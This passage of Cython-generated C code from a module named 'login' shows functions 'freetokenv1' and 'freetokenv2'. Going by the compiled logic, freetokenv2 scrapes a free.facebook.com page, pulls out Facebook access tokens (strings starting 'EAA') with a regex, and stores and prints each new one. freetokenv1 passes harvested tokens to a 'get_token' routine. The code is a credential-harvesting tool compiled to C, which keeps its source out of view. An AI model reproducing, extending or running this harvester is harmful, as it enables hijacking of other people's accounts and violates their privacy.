      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = __Pyx_PyNumber_Int(__pyx_v_pil); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 187, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = __Pyx_PyInt_SubtractObjC(__pyx_t_3, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 187, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_GetItem(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 187, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_v_tolkau = __pyx_t_3;
      __pyx_t_3 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_get_token); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 188, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_2, function);
        }
      }
      __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_1, __pyx_v_tolkau) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_v_tolkau);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 188, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    goto __pyx_L25_try_end;
    __pyx_L20_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_6) {
      __Pyx_AddTraceback("login.freetokenv1", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1) < 0) __PYX_ERR(0, 189, __pyx_L22_except_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __pyx_v_e = __pyx_t_2;
       {

        
        __pyx_t_4 = __Pyx_PyUnicode_FormatSafe(__pyx_kp_u_s, __pyx_v_e); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 190, __pyx_L31_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 190, __pyx_L31_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }

      
       {
        {
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L32;
        }
        __pyx_L31_error:;
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_21 = 0; __pyx_t_22 = 0; __pyx_t_23 = 0; __pyx_t_24 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_24, &__pyx_t_25, &__pyx_t_26);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_21, &__pyx_t_22, &__pyx_t_23) < 0)) __Pyx_ErrFetch(&__pyx_t_21, &__pyx_t_22, &__pyx_t_23);
          __Pyx_XGOTREF(__pyx_t_21);
          __Pyx_XGOTREF(__pyx_t_22);
          __Pyx_XGOTREF(__pyx_t_23);
          __Pyx_XGOTREF(__pyx_t_24);
          __Pyx_XGOTREF(__pyx_t_25);
          __Pyx_XGOTREF(__pyx_t_26);
          __pyx_t_6 = __pyx_lineno; __pyx_t_19 = __pyx_clineno; __pyx_t_20 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_24);
            __Pyx_XGIVEREF(__pyx_t_25);
            __Pyx_XGIVEREF(__pyx_t_26);
            __Pyx_ExceptionReset(__pyx_t_24, __pyx_t_25, __pyx_t_26);
          }
          __Pyx_XGIVEREF(__pyx_t_21);
          __Pyx_XGIVEREF(__pyx_t_22);
          __Pyx_XGIVEREF(__pyx_t_23);
          __Pyx_ErrRestore(__pyx_t_21, __pyx_t_22, __pyx_t_23);
          __pyx_t_21 = 0; __pyx_t_22 = 0; __pyx_t_23 = 0; __pyx_t_24 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0;
          __pyx_lineno = __pyx_t_6; __pyx_clineno = __pyx_t_19; __pyx_filename = __pyx_t_20;
          goto __pyx_L22_except_error;
        }
        __pyx_L32:;
      }
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L21_exception_handled;
    }
    goto __pyx_L22_except_error;
    __pyx_L22_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_10, __pyx_t_9);
    goto __pyx_L1_error;
    __pyx_L21_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_10, __pyx_t_9);
    __pyx_L25_try_end:;
  }

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_AddTraceback("login.freetokenv1", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_num);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v_pil);
  __Pyx_XDECREF(__pyx_v_tolkau);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_15freetokenv2(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); 
static PyMethodDef __pyx_mdef_5login_15freetokenv2 = {"freetokenv2", (PyCFunction)__pyx_pw_5login_15freetokenv2, METH_NOARGS, 0};
static PyObject *__pyx_pw_5login_15freetokenv2(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("freetokenv2 (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_14freetokenv2(__pyx_self);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_14freetokenv2(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_num = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v_pil = NULL;
  PyObject *__pyx_v_tolkau = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  int __pyx_t_13;
  int __pyx_t_14;
  int __pyx_t_15;
  PyObject *__pyx_t_16 = NULL;
  Py_UCS4 __pyx_t_17;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  char const *__pyx_t_20;
  PyObject *__pyx_t_21 = NULL;
  PyObject *__pyx_t_22 = NULL;
  PyObject *__pyx_t_23 = NULL;
  PyObject *__pyx_t_24 = NULL;
  PyObject *__pyx_t_25 = NULL;
  PyObject *__pyx_t_26 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("freetokenv2", 0);

  
  __Pyx_INCREF(__pyx_int_0);
  __pyx_v_num = __pyx_int_0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_parser); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ses); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_kp_u_https_free_facebook_com_10004070) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u_https_free_facebook_com_10004070);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  __pyx_t_6 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_6 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_t_5, __pyx_kp_u_html_parser};
    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_t_5, __pyx_kp_u_html_parser};
    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  } else
  #endif
  {
    __pyx_t_4 = PyTuple_New(2+__pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (__pyx_t_3) {
      __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_3); __pyx_t_3 = NULL;
    }
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_4, 0+__pyx_t_6, __pyx_t_5);
    __Pyx_INCREF(__pyx_kp_u_html_parser);
    __Pyx_GIVEREF(__pyx_kp_u_html_parser);
    PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_6, __pyx_kp_u_html_parser);
    __pyx_t_5 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_4, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_url = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_re); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 195, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_findall); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 195, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_v_url); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 195, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = NULL;
  __pyx_t_6 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
      __pyx_t_6 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_4)) {
    PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_kp_u_EAA_w, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 195, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
    PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_kp_u_EAA_w, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 195, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  } else
  #endif
  {
    __pyx_t_3 = PyTuple_New(2+__pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 195, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (__pyx_t_5) {
      __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_5); __pyx_t_5 = NULL;
    }
    __Pyx_INCREF(__pyx_kp_u_EAA_w);
    __Pyx_GIVEREF(__pyx_kp_u_EAA_w);
    PyTuple_SET_ITEM(__pyx_t_3, 0+__pyx_t_6, __pyx_kp_u_EAA_w);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_3, 1+__pyx_t_6, __pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_3, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 195, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_data = __pyx_t_1;
  __pyx_t_1 = 0;

  
  if (likely(PyList_CheckExact(__pyx_v_data)) || PyTuple_CheckExact(__pyx_v_data)) {
    __pyx_t_1 = __pyx_v_data; __Pyx_INCREF(__pyx_t_1); __pyx_t_7 = 0;
    __pyx_t_8 = NULL;
  } else {
    __pyx_t_7 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_data); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 196, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_8 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 196, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_8)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 196, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 196, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 196, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 196, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_8(__pyx_t_1);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 196, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XDECREF_SET(__pyx_v_token, __pyx_t_4);
    __pyx_t_4 = 0;

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_10, &__pyx_t_11);
      __Pyx_XGOTREF(__pyx_t_9);
      __Pyx_XGOTREF(__pyx_t_10);
      __Pyx_XGOTREF(__pyx_t_11);
       {

        
        __pyx_t_12 = PyObject_Length(__pyx_v_token); if (unlikely(__pyx_t_12 == ((Py_ssize_t)-1))) __PYX_ERR(0, 198, __pyx_L5_error)
        __pyx_t_13 = ((__pyx_t_12 >= 35) != 0);
        if (__pyx_t_13) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_freetoken); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 199, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_13 = (__Pyx_PySequence_ContainsTF(__pyx_v_token, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 199, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_14 = (__pyx_t_13 != 0);
          if (__pyx_t_14) {
            goto __pyx_L14;
          }

          
           {
            __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_v_num, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 201, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF_SET(__pyx_v_num, __pyx_t_4);
            __pyx_t_4 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_freetoken); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 202, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_15 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_v_token); if (unlikely(__pyx_t_15 == ((int)-1))) __PYX_ERR(0, 202, __pyx_L5_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_prints); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 203, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Panel); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 203, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_16 = PyTuple_New(4); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 203, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_12 = 0;
            __pyx_t_17 = 127;
            __Pyx_INCREF(__pyx_kp_u_bold_white);
            __pyx_t_12 += 13;
            __Pyx_GIVEREF(__pyx_kp_u_bold_white);
            PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_kp_u_bold_white);
            __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_num, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 203, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_17 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_17) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_17;
            __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
            __Pyx_GIVEREF(__pyx_t_18);
            PyTuple_SET_ITEM(__pyx_t_16, 1, __pyx_t_18);
            __pyx_t_18 = 0;
            __Pyx_INCREF(__pyx_kp_u_bold_green);
            __pyx_t_12 += 15;
            __Pyx_GIVEREF(__pyx_kp_u_bold_green);
            PyTuple_SET_ITEM(__pyx_t_16, 2, __pyx_kp_u_bold_green);
            __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 203, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_17 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_17) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_17;
            __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
            __Pyx_GIVEREF(__pyx_t_18);
            PyTuple_SET_ITEM(__pyx_t_16, 3, __pyx_t_18);
            __pyx_t_18 = 0;
            __pyx_t_18 = __Pyx_PyUnicode_Join(__pyx_t_16, 4, __pyx_t_12, __pyx_t_17); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 203, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __pyx_t_16 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
              __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_5);
              if (likely(__pyx_t_16)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_16);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
              }
            }
            __pyx_t_2 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_16, __pyx_t_18) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_18);
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 203, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
              }
            }
            __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_5, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 203, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_L14:;

          
        }

        
      }
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      goto __pyx_L12_try_end;
      __pyx_L5_error:;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;

      
       {
        __Pyx_AddTraceback("login.freetokenv2", __pyx_clineno, __pyx_lineno, __pyx_filename);
